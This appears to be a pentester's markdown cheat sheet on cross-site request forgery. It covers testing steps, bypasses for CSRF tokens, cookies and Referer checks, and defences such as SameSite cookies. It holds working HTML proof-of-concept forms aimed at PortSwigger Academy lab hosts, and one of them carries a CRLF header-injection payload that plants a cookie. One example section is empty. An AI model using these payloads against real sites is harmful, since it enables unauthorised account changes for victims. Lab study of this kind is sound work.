### Table of Contents
1. Checklist
  + Example script
2. Methodology
3. Testing CSRF
  + Testing CSRF Token
  + Testing CSRF Tokens and CSRF Cookies
  + Testing Referer header for CSRF attacks:
4. How CSRF Tokens Should Be Generated
5. How CSRF should be Transmitted
6. How CSRF Tokens Should Be Validated
7. Additional Defense
8. Inadequate Defense

---------------------------------------------------------

# 1 - Checklist: Things to look for
  * [ ] Is there a `relevant action`?
   - Such as changing an email
   
  * [ ] Is `cookie` based _session handling_ done?
   - Such as _session cookie_
   - Example: `Cookie: session=<seemingly_random_gibberish>`
   
  * [ ] NO `unredictable` request parameters?
   - Such as a _header value_ or in the _body_


---------------------------------------------------------

# 2 - Methodology
[Methodology]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection

**Burpsuite Pro**
+ Send `requests` of interest to _Burp Repeater_
+ After opening the `CSRF PoC Generator`
 - Click `Options` button
 - **Toggle On** `Include auto-submit script`

---------------------------------------------------------

# 3 - Testing CSRF


### Testing CSRF Token:
* In this case, the `CSRF Token` can be either the
  _cookie field_ or _body/header_ value

1. **Remove** the `CSRF Token` and see if the application accepts it
  + cookie
  + header / body
  
2. Can you **change** the _request method?_ to `GET` which **DOES NOT** 
   require a `CSRF Token`
  + Have to remove the `CSRF token` altogether
  + `GET` requests _do not always_ require a `CSRF Token`

3. See if `CSRF Token` is tied to a _user session_
  + Change the value of the `CSRF Token`
  + Try using _session_ information from _another user_
  
  + Check the example script below **CSRF where token is not tied to user session**

- - - - - - - - - - - - - - - - - - - - - - - -

### Testing CSRF Tokens and CSRF Cookies:
* Think of `CSRF Cookie` as the _cookie value_
* Think of `CSRF Token`  as the _body/header_ value

* Check if the `CSRF Token` is tied to the `CSRF Cookie`
  (_cookie_ & _body / header_)
   
1. Submit an invalid value for `CSRF Token`
  + Put `test`

2. Submit a valid `CSRF Token` from _another user_
  + Since there is a `CSRF Cookie` this is show that _two are tied together_
   - If this **FAILS** that means the token and cookie are tied together
  
3. Submit a valid `CSRF Token` **AND** `CSRF Cookie` from _another user_
  + If this **SUCCEEDS**, the `session cookie` is **NOT TIED** to the `CSRF Token & Cookie`
   - Keep in mind the `session cookie` and the `CSRF Cookie` **ARE DIFFERENT**
  
  + If this succeeds, try:
   - First, injecting a `CSRF Cookie` into the user's session (_HTTP HEADER INJECTION_)
    * This will _inject_ the _attacker's cookie_ into the cookie field
    * Look for a `Response` that has the **Set-Cookie:** _header_
    * If the `CSRF Token` is a **Header Value**, may need to _try something else_
    
    * Example:  `GET /?search=hat`
    * Modified: `GET /?search=hat%0d%0aSet-Cookie:%20csrfCookie=<other_user's_cookie>`
    
   - Then, send a CSRF attack with a **KNOWN** `CSRF Cookie`
    * This will functionally _inject_ the _attacker's cookie_ into the body
   
   - You can use the tool `Cookie Editor` to see cookie values you can use
   
   - Check the example script below **CSRF where token is tied to non-session cookie**

4. Check if the `CSRF Token` is duplicated in the `CSRF Cookie`
  + If it is, do something similar to step 3

  
- - - - - - - - - - - - - - - - - - - - - - - -

### Testing Referer header for CSRF attacks:
* Keep in mind the `Referer` header can be spoofed (difficult to do)
 + Not yet noted here how to do it
 
* App is probably making sure `Host` header and the `Referer` header match

1. Remove the `Referer` header
  + This can be spoofed, but that is difficult to do
  + Alternatively, you can use the **meta** tag: <meta>
   - Example: <meta name="referrer" content="never"> 
   - Check the example script below:
     **CSRF where Referer validation depends on header being present**

2. Check which _portion_ of the `referrer header` the app is _validating_
  + If the webiste is `website.com`, I can try:
   - `malicious.website.com`
   - `hacked-domain.com/?website.com`
    * `/?` makes it so `website.com` is an argument
  + Can use `<script>history.pushState('', '', '/?website.com')</script>`
   - Field 1 of `pushState` is _State Object_
   - Field 2 of `pushState` is _Title_
   - Field 3 of `pushState` is _URL_
    * Can give a partial url like `/?targetwebsite.com`
    * You can use `/?` so following website is a query paramter
    * Assumes app is not doing an exact match
    
   - May need to do header injection:
     `Referrer-Policy: unsafe-url`
   
   + Check the example script below:
     **CSRF with broken Referer validation**

---------------------------------------------------------

# 4 - How CSRF Tokens Should Be Generated

1. Use an **unpredictable** value to differentiate requests
  + such as a `CSRF Token`
2. Tied to **USER'S** session
3. Make sure that the `CSRF Token` is _validated_ **BEFORE** anything
   requiring validation

---------------------------------------------------------

# 5 - How CSRF should be Transmitted

  **More Secure**
1. Hidden field of an _HTML Form_ using a _POST_ method
2. Custom request header (not common)

  **Less Secure**
3. Token submitted in the URL (less secure)
  + URLs can be logged in the back end
  + URLs are part of _Referer_ header so 3rd party apps can see it
  + Someone behind you can see it
4. Tokens transmitted within cookies
  + Shouldn't do this
  + When user clicks malicious link they might be able to access the both the:
   - Session cookie
   - CRSF Token as a cookie

  **Stateless Authentication**
5. Double submit cookie for stateless
  + Include `CSRF cookie` & `CSRF Token`
   - Double checks that both values are equal
  + If an **HTTP Header Injection** exists I can **INJECT A COOKIE**
    into a user's browser and add the cookie as a parameter to bypass this

---------------------------------------------------------

# 6 - How CSRF Tokens Should Be Validated

1. Generated and stored _server side_
2. Verify tokens for _every request_
3. Validation is done _regardless of HTTP method/content type_
4. If a token is **ABSENT** request is rejected

---------------------------------------------------------

# 7 - Additional Defense

 **SameSite Cookies**
 [Resource]: https://web.dev/samesite-cookies-explained/
 
1. `Set-Cookie: sesson=test; SameSite = Strict`
  + Only sent on first part conext and not by 3rd party
   - Usually not used cause it limits functionality
  + A malicious website would be rejected because it's not 1st party

2. `Set-Cookie: sesson=test; SameSite = Lax`
  + This is the _default_ if **NOT specified**
  + Allows _third party_ under 2 conditions
   - The _HTTP request_ is a `GET Method` (any other method like POST is not allowed)
   - Done by _top level navigation_ like clicking a link so the cookie is not
      sent by a script
  ```Example
      <!-- Cookie NOT SENT when browser requests cat.png -->
      <img src = "https://blog.example/blog/img/cat.png" />
      
      <!-- Cookie would only get sent if the user went to the link -->
  ```

3. `Set-Cookie: sesson=choco; SameSite = None; Secure`

---------------------------------------------------------

# 8 - Inadequate Defense

### Referer Header
  + Referer `HTTP request header` contains an absolute/parital _address of page
    making the request_
  + Checks if the `domain` of _matches_ the referer
  

  + These can be _spoofed_ (though difficult)
 **Potential Bypasses**
   - If it's _NOT present_, the application does _NOT check for it_
   - _ONLY_ checks if the `domain` _is in the request_ and _NOT an exact match_
     `www.malicious.com/?targetdomain.com`

---------------------------------------------------------

# 9 - Example Scripts
 * Keep in mind these scripts target `Portswigger Academy's` **change email** examples


**CSRF with broken Referer validation**

s

**CSRF where Referer validation depends on header being present**

<html>
    <head>
        <meta name="referrer" content="never"> 
    </head>
    <body>
        <h1>Hello world!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://acd11fbc1fb050118088218e00de0010.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form" target="csrf-iframe">
            <!-- CSRF Attack Here for changing email -->
            <input type="hidden" name="email" value="test5@test.ca">
        </form>
        <!-- Commented Out the Javascript Below -->
        <!-- <script>document.getElementById("csrf-form").submit()</script> -->
    </body>
</html>

- - - - - - - - - - - - - - - - - - - - - - - -

**CSRF where token is tied to non-session cookie**
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://ac151f291fb50bc28036e5bb00f6000b.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <!-- CSRF Attack Here for changing email -->
            <input type="hidden" name="email" value="test5@test.ca">
            <!-- Setting the CSRF Value Here; using another user's session -->
            <input type="hidden" name="csrf" value="SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb">
        </form>
        <!-- This does the HTTP Header Injection -->
        <!-- %0d%0aSet-Cookie:%20csrfKey=ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH -->
        <!-- Uses the `onerror` to submit form -->
        <!-- ================================= -->
        <!-- Commented Out the img tag that executes Javascript throught `onerror`
        <img style="display:none;" src="https://ac151f291fb50bc28036e5bb00f6000b.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH" onerror="document.forms[0].submit()">
        -->
    </body>
</html>

- - - - - - - - - - - - - - - - - - - - - - - -

**CSRF where token is not tied to user session**
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-ac941f081e38bc8480279ef400d5002f.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <!-- CSRF Attack Here for changing email -->
            <input type="hidden" name="email" value="test5@test.ca">
            <!-- Setting the CSRF Value Here; using another user's session -->
            <input type="hidden" name="csrf" value="zXqP4oMlBXDX16q4Qb5MgFawPZXaK4bW">
        </form>
        <!-- Commented Out the Javascript Below -->
        <!-- <script>document.getElementById("csrf-form").submit()</script> -->
    </body>
</html>

- - - - - - - - - - - - - - - - - - - - - - - -

**Basic CSRF: No Checks**
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="get" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>
        <!-- Commented Out the Javascript Below -->
        <!-- <script>document.getElementById("csrf-form").submit()</script> -->
    </body>
</html>
